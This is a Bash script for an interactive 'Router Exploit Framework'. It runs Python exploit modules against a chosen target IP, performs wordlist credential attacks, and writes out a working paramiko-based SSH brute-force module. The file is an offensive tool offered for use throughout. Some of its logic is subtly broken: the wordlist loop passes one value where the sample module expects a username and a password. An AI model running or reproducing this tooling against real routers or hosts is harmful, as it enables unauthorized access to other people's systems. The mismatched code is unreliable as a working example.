#!/bin/bash
# rsf663.sh - Router Exploit Framework (v6.6.3) with Python Version Testing

VERSION="6.6.3"
TARGET=""
MODULES_DIR="./modules"
WORDLISTS_DIR="./wordlists"
MODULES=()
SELECTED_MODULE=""
SELECTED_WORDLIST=""
COOLDOWN=4

export PYTHONPATH="$MODULES_DIR:$PYTHONPATH"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

banner() {
    echo -e "${RED}"
    echo '   ____  _____  ______   ___   _____________ '
    echo '  / __ \/ ___/ / ____/  /   | / ____/ ____/ '
    echo ' / /_/ /\__ \ / /_     / /| |/ /_  / /_     '
    echo '/ _, _/___/ / __/    / ___ / __/ / __/     '
    echo '/_/ |_|/____/_/      /_/  |_/_/   /_/       '
    echo -e "${NC}"
    echo "       Router Exploit Framework v$VERSION"
    echo "       Automatic Python Version Testing"
    echo ""
}

create_dir() {
    if [ ! -d "$1" ]; then
        mkdir -p "$1"
        echo -e "${YELLOW}[+] Created directory: $1${NC}"
    fi
}

find_wordlists() {
    if [ -z "$SELECTED_MODULE" ]; then
        echo -e "${RED}No module selected!${NC}"
        return
    fi

    create_dir "$WORDLISTS_DIR"

    WORDLISTS=()
    local module_lower=$(echo "$SELECTED_MODULE" | tr '[:upper:]' '[:lower:]')
    
    while IFS= read -r -d $'\0' wordlist; do
        local wl_name=$(basename "$wordlist" | tr '[:upper:]' '[:lower:]')
        if [[ "$wl_name" =~ "$module_lower" ]] || [[ "$wl_name" =~ "common" ]] || [[ "$wl_name" =~ "default" ]] || [[ "$wl_name" =~ "pass" ]] || [[ "$wl_name" =~ "creds" ]]; then
            WORDLISTS+=("$wordlist")
        fi
    done < <(find "$WORDLISTS_DIR" -type f -print0)

    if [ ${#WORDLISTS[@]} -eq 0 ]; then
        echo -e "${YELLOW}[-] No wordlists found for $SELECTED_MODULE in $WORDLISTS_DIR${NC}"
        echo -e "${YELLOW}[*] Create wordlists named like: ${module_lower}_passwords.txt${NC}"
        return 1
    else
        echo -e "${GREEN}[+] Found ${#WORDLISTS[@]} wordlists:${NC}"
        for i in "${!WORDLISTS[@]}"; do
            echo "  $((i+1))) $(basename "${WORDLISTS[$i]}") (Lines: $(wc -l < "${WORDLISTS[$i]}"))"
        done
        return 0
    fi
}

show_module_options() {
    if [ -z "$SELECTED_MODULE" ]; then
        echo -e "${RED}No module selected! Use 'use <module>' first.${NC}"
        return
    fi
    
    if [ ! -f "$MODULES_DIR/$SELECTED_MODULE.py" ]; then
        echo -e "${RED}Module file not found!${NC}"
        return
    fi
    
    echo -e "${GREEN}Module options for $SELECTED_MODULE:${NC}"
    
    options=$(grep -A10 'if __name__ == "__main__":' "$MODULES_DIR/$SELECTED_MODULE.py" | grep -i 'sys.argv')
    
    if [ ! -z "$options" ]; then
        echo "  Usage options from module:"
        echo -e "    ${BLUE}$options${NC}"
    else
        echo "  No specific options found in module (uses default target IP)"
    fi
    
    params=$(grep -i '^# Option:' "$MODULES_DIR/$SELECTED_MODULE.py" | cut -d':' -f2-)
    if [ ! -z "$params" ]; then
        echo "  Configurable parameters:"
        while read -r param; do
            echo -e "    ${YELLOW}$param${NC}"
        done <<< "$params"
    fi
    
    if grep -q "# Supports wordlists:" "$MODULES_DIR/$SELECTED_MODULE.py"; then
        echo -e "\n${GREEN}Wordlist Support:${NC} This module supports wordlist attacks"
        find_wordlists
    fi
}

run_module() {
    if [ -z "$SELECTED_MODULE" ]; then
        echo -e "${RED}No module selected! Use 'use <module>' first.${NC}"
        return
    fi
    
    if [ -z "$TARGET" ]; then
        echo -e "${RED}No target set! Use 'set target <ip>' first.${NC}"
        return
    fi
    
    if [ ! -f "$MODULES_DIR/$SELECTED_MODULE.py" ]; then
        echo -e "${RED}Module file not found!${NC}"
        return
    fi

    if grep -q "# Supports wordlists:" "$MODULES_DIR/$SELECTED_MODULE.py"; then
        echo -e "${GREEN}[*] This module supports wordlist attacks${NC}"
        if find_wordlists; then
            read -p "Use wordlist attack? (y/n) " -n 1 -r
            echo
            if [[ $REPLY =~ ^[Yy]$ ]]; then
                select_wordlist
                if [ -n "$SELECTED_WORDLIST" ]; then
                    run_wordlist_attack
                    return
                fi
            fi
        fi
    fi

    echo -e "${YELLOW}[*] Waiting $COOLDOWN seconds for module to load properly...${NC}"
    for ((i=COOLDOWN; i>0; i--)); do
        echo -ne "${YELLOW}[*] Starting in $i seconds...\033[0K\r${NC}"
        sleep 1
    done

    echo -e "${GREEN}[*] Testing module with Python 3...${NC}"
    output=$(python3 "$MODULES_DIR/$SELECTED_MODULE.py" "$TARGET" 2>&1)
    
    if [[ "$output" == *"VULNERABLE"* ]] || 
       [[ "$output" == *"SUCCESS"* ]] || 
       [[ "$output" == *"EXPLOITED"* ]] || 
       [[ "$output" == *"SHELL"* ]] ||
       [[ "$output" == *"authenticated"* ]] ||
       [[ "$output" == *"injected"* ]]; then
        echo -e "${GREEN}[+] VULNERABLE (Python3): Target is vulnerable to $SELECTED_MODULE${NC}"
        echo -e "${GREEN}[*] Module output:${NC}"
        echo "$output"
    else
        echo -e "${YELLOW}[-] Python3 attempt failed, trying Python 2...${NC}"
        output=$(python2 "$MODULES_DIR/$SELECTED_MODULE.py" "$TARGET" 2>&1)
        
        if [[ "$output" == *"VULNERABLE"* ]] || 
           [[ "$output" == *"SUCCESS"* ]] || 
           [[ "$output" == *"EXPLOITED"* ]] || 
           [[ "$output" == *"SHELL"* ]] ||
           [[ "$output" == *"authenticated"* ]] ||
           [[ "$output" == *"injected"* ]]; then
            echo -e "${GREEN}[+] VULNERABLE (Python2): Target is vulnerable to $SELECTED_MODULE${NC}"
            echo -e "${GREEN}[*] Module output:${NC}"
            echo "$output"
        else
            echo -e "${RED}[-] NOT VULNERABLE: Target does not appear to be vulnerable to $SELECTED_MODULE${NC}"
            echo -e "${YELLOW}[*] Module output:${NC}"
            echo "$output"
        fi
    fi
}

run_wordlist_attack() {
    if [ -z "$SELECTED_WORDLIST" ]; then
        echo -e "${RED}No wordlist selected!${NC}"
        return
    fi

    local total_lines=$(wc -l < "$SELECTED_WORDLIST")
    local current_line=0
    local found=0

    echo -e "${GREEN}[*] Starting wordlist attack on $TARGET using $SELECTED_MODULE..."
    echo -e "[*] Wordlist: $(basename "$SELECTED_WORDLIST") ($total_lines entries)${NC}"
    echo -e "[*] Press Ctrl+C to stop the attack\n"

    echo -e "${YELLOW}[*] Waiting $COOLDOWN seconds before starting wordlist attack...${NC}"
    for ((i=COOLDOWN; i>0; i--)); do
        echo -ne "${YELLOW}[*] Starting in $i seconds...\033[0K\r${NC}"
        sleep 1
    done

    while IFS= read -r line; do
        ((current_line++))
        echo -ne "[*] Trying $current_line/$total_lines: $line\r"
        
        output=$(python3 "$MODULES_DIR/$SELECTED_MODULE.py" "$TARGET" "$line" 2>&1)
        
        if [[ $? -ne 0 ]] || [[ "$output" == *"SyntaxError"* ]]; then
            output=$(python2 "$MODULES_DIR/$SELECTED_MODULE.py" "$TARGET" "$line" 2>&1)
        fi
        
        if [[ "$output" == *"success"* ]] || 
           [[ "$output" == *"authenticated"* ]] || 
           [[ "$output" == *"valid"* ]] || 
           [[ "$output" == *"logged in"* ]] ||
           [[ "$output" == *"vulnerable"* ]] ||
           [[ "$output" == *"exploited"* ]]; then
            echo -e "\n${GREEN}[+] VULNERABLE: Success with $line${NC}"
            found=1
            echo -e "${GREEN}[*] Running module actions...${NC}"
            if python3 "$MODULES_DIR/$SELECTED_MODULE.py" "$TARGET" "$line" >/dev/null 2>&1; then
                python3 "$MODULES_DIR/$SELECTED_MODULE.py" "$TARGET" "$line"
            else
                python2 "$MODULES_DIR/$SELECTED_MODULE.py" "$TARGET" "$line"
            fi
            break
        fi
    done < "$SELECTED_WORDLIST"

    if [ $found -eq 0 ]; then
        echo -e "\n${RED}[-] NOT VULNERABLE: Attack completed. No valid credentials found.${NC}"
    fi
}

select_wordlist() {
    if [ ${#WORDLISTS[@]} -eq 0 ]; then
        echo -e "${RED}No wordlists available!${NC}"
        return 1
    fi

    echo -e "${GREEN}Select a wordlist:${NC}"
    for i in "${!WORDLISTS[@]}"; do
        echo "  $((i+1))) $(basename "${WORDLISTS[$i]}")"
    done

    read -p "Enter choice (1-${#WORDLISTS[@]}): " choice
    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le ${#WORDLISTS[@]} ]; then
        SELECTED_WORDLIST="${WORDLISTS[$((choice-1))]}"
        echo -e "${GREEN}[+] Selected: $(basename "$SELECTED_WORDLIST")${NC}"
        return 0
    else
        echo -e "${RED}Invalid selection!${NC}"
        return 1
    fi
}

show_help() {
    echo -e "${YELLOW}Available commands:${NC}"
    echo "  help                  - Show this help message"
    echo "  banner                - Show the banner"
    echo "  exit/quit             - Exit the framework"
    echo "  set target <ip>       - Set target router IP"
    echo "  show targets          - Show current target"
    echo "  show modules          - List discovered exploit modules"
    echo "  search <keyword>      - Search module contents"
    echo "  use <module>          - Select a module"
    echo "  info                  - Show module information"
    echo "  options               - Show module options and wordlists"
    echo "  run                   - Run selected module (with wordlist support)"
    echo ""
    echo -e "${YELLOW}INFO ON WORDLIST / OTHERS:${NC}"
    echo "  - Place wordlists in ./wordlists/"
    echo "  - Name them like: [module]_passwords.txt"
    echo "  - Modules with '# Supports wordlists:' will auto-detect them"
    echo "  - NOTE. MOST OF THE INJECTIONS / EXPLOITS / EVASIONS / SCANNERS ARE GIVING OUT BLIND OUTPUT."
    echo ""
}

discover_modules() {
    echo -e "${GREEN}[*] Discovering exploit modules...${NC}"
    create_dir "$MODULES_DIR"
    MODULES=($(find "$MODULES_DIR" -type f -name "*.py" -exec grep -l -E 'exploit|rsf|Exploit|RSF' {} + 2>/dev/null | xargs -I{} basename {} .py))
    
    if [ ${#MODULES[@]} -eq 0 ]; then
        echo -e "${RED}[-] No exploit modules found!${NC}"
        echo -e "${YELLOW}[*] Place your exploit modules in $MODULES_DIR${NC}"
        create_sample_modules
        MODULES=($(find "$MODULES_DIR" -type f -name "*.py" -exec grep -l -E 'exploit|rsf|Exploit|RSF' {} + 2>/dev/null | xargs -I{} basename {} .py))
    fi
    
    echo -e "${GREEN}[+] Found ${#MODULES[@]} exploit modules${NC}"
}

create_sample_modules() {
    cat > "$MODULES_DIR/ssh_bruteforce.py" << 'EOL'
#!/usr/bin/env python3
# RSF Exploit Module
# Description: SSH Bruteforce Module
# Author: RSF Team
# Supports wordlists: Yes
# Usage: <target_ip> <username> <password>

import paramiko
import sys
import socket

def ssh_bruteforce(target, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, username=username, password=password, timeout=5)
        print(f"[+] Success! Credentials: {username}:{password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except socket.timeout:
        print("[-] Connection timeout")
        return False
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: ./ssh_bruteforce.py <target_ip> <username> <password>")
        sys.exit(1)
    
    target = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    
    if not ssh_bruteforce(target, username, password):
        sys.exit(1)
EOL

    echo -e "${GREEN}[+] Created sample SSH bruteforce module in $MODULES_DIR${NC}"
}

list_modules() {
    if [ ${#MODULES[@]} -eq 0 ]; then
        discover_modules
    fi
    
    echo -e "${GREEN}Discovered modules:${NC}"
    for module in "${MODULES[@]}"; do
        echo -n "  $module"
        if grep -q "# Supports wordlists:" "$MODULES_DIR/$module.py"; then
            echo -e " ${YELLOW}(wordlist support)${NC}"
        else
            echo
        fi
        desc=$(grep -i '^# Description:' "$MODULES_DIR/$module.py" | cut -d':' -f2-)
        [ ! -z "$desc" ] && echo -e "    ${BLUE}Description:$desc${NC}"
    done
    echo ""
}

search_modules() {
    if [ -z "$1" ]; then
        echo "Usage: search <keyword>"
        return
    fi
    
    echo -e "${GREEN}Search results for '$1':${NC}"
    found=0
    for module in "${MODULES[@]}"; do
        if grep -qi "$1" "$MODULES_DIR/$module.py"; then
            echo "  $module"
            found=1
        fi
    done
    
    if [ $found -eq 0 ]; then
        echo "  No matching modules found"
    fi
    echo ""
}

show_module_info() {
    if [ -z "$SELECTED_MODULE" ]; then
        echo -e "${RED}No module selected! Use 'use <module>' first.${NC}"
        return
    fi
    
    if [ ! -f "$MODULES_DIR/$SELECTED_MODULE.py" ]; then
        echo -e "${RED}Module file not found!${NC}"
        return
    fi
    
    echo -e "${GREEN}Module information:${NC}"
    echo "  Name: $SELECTED_MODULE"
    
    desc=$(grep -i '^# Description:' "$MODULES_DIR/$SELECTED_MODULE.py" | cut -d':' -f2-)
    author=$(grep -i '^# Author:' "$MODULES_DIR/$SELECTED_MODULE.py" | cut -d':' -f2-)
    target=$(grep -i '^# Vulnerable:' "$MODULES_DIR/$SELECTED_MODULE.py" | cut -d':' -f2-)
    cve=$(grep -i '^# CVE:' "$MODULES_DIR/$SELECTED_MODULE.py" | cut -d':' -f2-)
    supports_wordlists=$(grep -i '^# Supports wordlists:' "$MODULES_DIR/$SELECTED_MODULE.py" | cut -d':' -f2-)
    
    [ ! -z "$desc" ] && echo "  Description:$desc"
    [ ! -z "$author" ] && echo "  Author:$author"
    [ ! -z "$target" ] && echo "  Vulnerable:$target"
    [ ! -z "$cve" ] && echo "  CVE:$cve"
    [ ! -z "$supports_wordlists" ] && echo -e "  ${YELLOW}Supports wordlist attacks${NC}"
    
    echo ""
}

main_shell() {
    banner
    create_dir "$MODULES_DIR"
    create_dir "$WORDLISTS_DIR"
    discover_modules
    show_help
    
    while true; do
        if [ -z "$TARGET" ]; then
            prompt="rsf663 > "
        else
            if [ -z "$SELECTED_MODULE" ]; then
                prompt="rsf663 ($TARGET) > "
            else
                prompt="rsf663 ($TARGET:$SELECTED_MODULE) > "
            fi
        fi
        
        read -p "$prompt" -e cmd arg1 arg2 arg3
        
        case $cmd in
            help) show_help ;;
            banner) banner ;;
            exit|quit) echo "Goodbye!"; exit 0 ;;
            set)
                if [ "$arg1" = "target" ] && [ ! -z "$arg2" ]; then
                    TARGET="$arg2"
                    echo -e "${GREEN}Target set to $TARGET${NC}"
                else
                    echo "Usage: set target <ip>"
                fi
                ;;
            show)
                if [ "$arg1" = "targets" ]; then
                    if [ -z "$TARGET" ]; then
                        echo "No target set"
                    else
                        echo "Current target: $TARGET"
                    fi
                elif [ "$arg1" = "modules" ]; then
                    list_modules
                else
                    echo "Usage: show [targets|modules]"
                fi
                ;;
            search) search_modules "$arg1" ;;
            use)
                if [ ! -z "$arg1" ]; then
                    if [[ " ${MODULES[@]} " =~ " ${arg1} " ]]; then
                        SELECTED_MODULE="$arg1"
                        SELECTED_WORDLIST=""
                        echo -e "${GREEN}Using module $arg1${NC}"
                        show_module_info
                    else
                        echo -e "${RED}Module not found!${NC}"
                    fi
                else
                    echo "Usage: use <module>"
                fi
                ;;
            info) show_module_info ;;
            options) show_module_options ;;
            run) run_module ;;
            *)
                if [ ! -z "$cmd" ]; then
                    echo "Unknown command: $cmd"
                    echo "Type 'help' for available commands"
                fi
                ;;
        esac
    done
}

main_shell
